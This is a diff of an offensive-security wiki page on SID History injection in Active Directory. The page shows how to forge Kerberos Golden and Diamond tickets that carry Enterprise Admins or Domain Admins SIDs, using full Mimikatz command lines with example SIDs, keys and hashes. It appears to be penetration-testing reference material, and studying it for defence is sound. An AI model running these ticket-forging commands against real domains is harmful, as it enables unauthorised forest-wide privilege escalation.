@@ -16,15 +16,11 @@ Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
 
 </details>
 
-## Attack
-
 SID History was designed to support migration scenarios, where a user would be moved from one domain to another. To preserve access to resources in the "old" domain, the **user's previous SID would be added to the SID History** of their new account. So when creating such a ticket, the SID of a privileged group (EAs, DAs, etc) in the parent domain can be added that will **grant access to all resources in the parent**.
 
 This can be achieved using either a [**Golden**](sid-history-injection.md#golden-ticket) or [**Diamond Ticket**](sid-history-injection.md#diamond-ticket).
 
-For finding the **SID** of the **"Enterprise Admins"** group you can find the **SID** of the **root domain** and set it in `S-1-5-21-<root domain>-519`. For example, from root domain SID `S-1-5-21-280534878-1496970234-700767426` the **"Enterprise Admins"** group SID is `S-1-5-21-280534878-1496970234-700767426-519`
-
-You could also use the **Domain Admins** groups, which ends in **512**.
+For finding the **SID** of the **"Enterprise Admins"** group you can find the **SID** of the **root domain** and set it in `S-1-5-21-<root domain>-519`. For example, from root domain SID `S-1-5-21-280534878-1496970234-700767426` the "Enterprise Admins"group SID is `S-1-5-21-280534878-1496970234-700767426-519`
 
 Another way yo find the SID of a group of the other domain (for example "Domain Admins") is with:
 
@@ -32,22 +28,22 @@ Another way yo find the SID of a group of the other domain (for example "Domain 
 Get-DomainGroup -Identity "Domain Admins" -Domain parent.io -Properties ObjectSid
 ```
 
-### Golden Ticket (Mimikatz) with KRBTGT-AES256
+#### Golden Ticket
 
-```bash
-mimikatz.exe "kerberos::golden /user:Administrator /domain:<current_domain> /sid:<current_domain_sid> /sids:<victim_domain_sid_of_group> /aes256:<krbtgt_aes256> /startoffset:-10 /endin:600 /renewmax:10080 /ticket:ticket.kirbi" "exit"
+```powershell
+Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /rc4:7ef5be456dc8d7450fb8f5f7348746c5 /service:krbtgt /target:moneycorp.local /ticket:C:\AD\Tools\kekeo_old\trust_tkt.kirbi"'
+# /domain:<Current domain>
+# /sid:<SID of current domain>
+# /sids:<SID of the Enterprise Admins group of the parent domain>
+# /rc4:<Trusted key>
+# /aer256:<AES hash> - This or /rc4
+# /user:Administrator
+# /service:<target service>
+# /target:<Other domain>
+# /ticket:C:\path\save\ticket.kirbi
 
-/user is the username to impersonate.
-/domain is the current domain.
-/sid is the current domain SID.
-/sids is the SID of the target group to add ourselves to.
-/aes256 is the AES256 key of the current domain's krbtgt account.
-/startoffset sets the start time of the ticket to 10 mins before the current time.
-/endin sets the expiry date for the ticket to 60 mins.
-/renewmax sets how long the ticket can be valid for if renewed.
-
-# The previous command will generate a file called ticket.kirbi
-# Just loading you can perform a dcsync attack agains the domain
+# Mimikatz example using aes and different TGT timings for opsec
+kerberos::golden /user:Administrator /domain:current.domain.io /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-1874506631-3219952063-538504511-512 /aes256:390b2fdb13cc820d73ecf2dadddd4c9d76425d4c2156b89ac551efb9d591a8aa /startoffset:-10 /endin:600 /renewmax:10080 /ticket:doamin.kirbi
 ```
 
 For more info about golden tickets check:
@@ -56,7 +52,7 @@ For more info about golden tickets check:
 [golden-ticket.md](golden-ticket.md)
 {% endcontent-ref %}
 
-### Diamond Ticket (Rubeus + KRBTGT-AES256)
+#### Diamond Ticket
 
 ```powershell
 # Use the /sids param
